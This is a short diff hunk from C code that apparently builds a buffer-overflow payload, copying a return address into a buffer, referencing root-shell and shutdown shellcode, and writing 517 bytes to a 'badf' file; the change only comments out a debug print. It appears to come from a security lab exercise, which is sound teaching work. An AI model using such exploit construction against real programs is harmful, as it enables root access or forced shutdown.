@@ -18,7 +18,7 @@ int main(){
 	for(int i=0;i<strlen(ret_addr);i++){
 		buff[ind++] = ret_addr[i];
 	}
-	printf("%d",strlen(root_shell));
+//	printf("%d %d",strlen(root_shell), strlen(shutdown_shellcode));
 
 	fwrite(buff,517,1,badf);
 	return 0;
